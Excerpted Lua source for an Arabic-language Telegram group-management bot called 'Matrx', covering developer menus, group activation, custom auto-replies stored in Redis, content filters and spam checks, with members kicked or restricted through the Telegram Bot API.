local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاذاعه لسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالعام لسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بردود الخاص لسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
local key = {{'↫ اوامر التسليه ᥀','↫ الاوامر الخدميه  ᥀'},{'↫ اوامر النسب ᥀','↫ البوتات ᥀'},{'↫ العاب ᥀'},{'↫  السورس ᥀','↫  المطور ᥀'},{'↫ رجوع ᥀'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر التسليه ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
local key = {{'↫ بوت الحذف ᥀','↫ بوت الهمسه ᥀'},{'↫ بوت اليوتيوب ᥀','↫ بوت الكت ᥀'},{'↫ بوت الزخرفه ᥀'},{'↫  رجوع  ᥀'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر النسب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
local key = {{'↫ نسبه الكره ᥀','↫ نسبه الحب ᥀'},{'↫ نسبه الرجوله ᥀','↫ نسبه الانوثه ᥀'},{'↫ نسبه الغباء ᥀','↫ نسبه الجمال ᥀'},{'↫ نسبه الخيانه ᥀'},{'↫  رجوع  ᥀'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بألعاب سورس ماتركس فقط اضغط على اللعبه الذي تريد لعبها'
...
if not DevRio:get(Matrx..'Rio:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {{{text="• ᥀ المطور . •",url="t.me/"..(dp.username_ or "FZOFZ")}},{{text="• ᥀ السورس . •",url="https://t.me/FZOFZ"},{text="• ᥀ لتنصيب بوت . •",url="https://t.me/IIRIIRI"}},{{text="• ᥀ اضفني في مجموعتك . •",url="t.me/"..dp.username_.."?startgroup=botstart"}}}
local start = DevRio:get(Matrx.."Rio:Start:Bot")
if start then 
Start_Source = start
else
...
DevRio:setex(Matrx..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source Matrx     --
if not SecondSudo(msg) and not DevRio:sismember(Matrx..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(Matrx..'Rio:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "FZOFZ")..')', 1, 'md') 
...
DevRio:sadd(Matrx..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:srem(Matrx..'Rio:Ban:Pv',data.id_)  
return false  
end 
...
--     Source Matrx     --
if text and DevRio:get(Matrx..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevRio:del(Matrx..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevRio:set(Matrx.."Rio:Start:Bot",text)  
...
DevRio:set(Matrx..'Rio:Start:Bots'..msg.sender_user_id_,true) 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ᥀' and ChCheck(msg) then  
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Texting:Pv',true) 
end
if Sudo(msg) then
...
local MatrxTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..MatrxTeam[math.random(#MatrxTeam)]..'' , 1, 'md')  
return false
end
--     Source Matrx     --
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or FZOFZ}}}
...
local my_ph = DevRio:get(Matrx.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevRio:get(Matrx..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*᥀︙قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
...
DevRio:srem(Matrx.."Rio:Groups", dp.id_)
else
...
DevRio:incr(Matrx..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(Matrx.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevRio:get(Matrx.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevRio:sadd(Matrx..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
DevRio:srem(Matrx.."Rio:Groups", msg.chat_id_) 
...
if DevRio:get(Matrx..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevRio:incr(Matrx..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevRio:incr(Matrx..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source Matrx     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevRio:get(Matrx..'Rio:Lock:FreeBot'..Matrx) then
if ChatType == 'pv' then
...
DevRio:sadd(Matrx..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Matrx..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevRio:sadd(Matrx..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
...
DevRio:sadd(Matrx.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:sadd(Matrx.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Matrx.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:srem(Matrx.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(Matrx..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevRio:get(Matrx..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevRio:get(Matrx..'Rio:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(Matrx.."Rio:Groups",msg.chat_id_)
DevRio:sadd(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevRio:set(Matrx.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevRio:set(Matrx..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Matrx     --
local ReFalse = tostring(msg.chat_id_)
if not DevRio:sismember(Matrx.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevRio:get(Matrx..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevRio:sadd(Matrx..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevRio:get(Matrx.."Rio:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevRio:smembers(Matrx.."Rio:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevRio:smembers(Matrx.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevRio:smembers(Matrx.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
--     Source Matrx     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevRio:get(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevRio:get(Matrx..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevRio:del(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Matrx..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Matrx..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Matrx..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevRio:get(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Matrx.."Rio:Gif:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:Voice:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:Audio:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:Photo:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:Stecker:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:Video:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:File:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:Text:AllRed"..msg.content_.text_)
DevRio:del(Matrx.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source Matrx     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevRio:get(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevRio:get(Matrx..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(Matrx..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevRio:del(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevRio:del(Matrx..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(Matrx..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevRio:get(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local MatrxTeam =  DevRio:smembers(Matrx..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..MatrxTeam[math.random(#MatrxTeam)]..']' , 1, 'md')  
end
end
--     Source Matrx     --
if text and text:match("^(.*)$") then
local SaveKt = DevRio:get(Matrx..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SaveKt == 'SaveKt' then
local GetKtTexts = DevRio:get(Matrx..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(Matrx..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ اسئلة الكت  ↫ "..GetKtTexts ,  1, "md")
DevRio:del(Matrx..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_)
DevRio:del(Matrx..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Matrx..'Rio:Sudo:Kt'..msg.chat_id_,GetKtTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(Matrx..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_,Text)
if #List == 100 then 
...
if text and not DevRio:get(Matrx..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(Matrx..'Rio:Sudo:Kt'..msg.chat_id_,text) then
local MatrxTeam =  DevRio:smembers(Matrx..'Rio:Text:KtTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..MatrxTeam[math.random(#MatrxTeam)]..']' , 1, 'md')  
end
end
--     Source Matrx     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevRio:get(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevRio:get(Matrx..'DelManagerRep'..msg.chat_id_)
DevRio:srem(Matrx..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(Matrx..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Matrx..'DelManagerRep'..msg.chat_id_)
return false
end
DevRio:del(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevRio:get(Matrx..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevRio:set(Matrx..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevRio:set(Matrx..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevRio:set(Matrx..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevRio:set(Matrx..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevRio:set(Matrx..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevRio:set(Matrx..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevRio:set(Matrx..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevRio:set(Matrx..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevRio:get(Matrx..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevRio:get(Matrx..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Matrx..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Matrx..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Matrx..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Matrx..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Matrx..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Matrx..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Matrx..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Matrx..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Matrx..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevRio:get(Matrx..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function MatrxTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(Matrx..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Matrx..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevRio:get(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevRio:get(Matrx..'DelSudoRep')
DevRio:del(Matrx.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(Matrx.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Matrx.."DelSudoRep")
return false
end
DevRio:del(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevRio:get(Matrx.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevRio:set(Matrx.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevRio:set(Matrx.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevRio:set(Matrx.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevRio:set(Matrx.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevRio:set(Matrx.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevRio:set(Matrx.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevRio:set(Matrx.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevRio:set(Matrx.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevRio:del(Matrx.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Matrx..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevRio:get(Matrx..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevRio:get(Matrx.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Matrx.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevRio:get(Matrx.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Matrx.."Rio:File:AllRed"..msg.content_.text_))
end
if DevRio:get(Matrx.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevRio:get(Matrx.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevRio:get(Matrx.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevRio:get(Matrx.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Matrx.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevRio:get(Matrx.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Matrx.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevRio:get(Matrx.."Rio:Text:AllRed"..msg.content_.text_) then
function MatrxTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(Matrx..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Matrx.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevRio:sismember(Matrx..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevRio:sadd(Matrx..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--     Source Matrx     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Matrx then
floods = DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevRio:get(Matrx.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
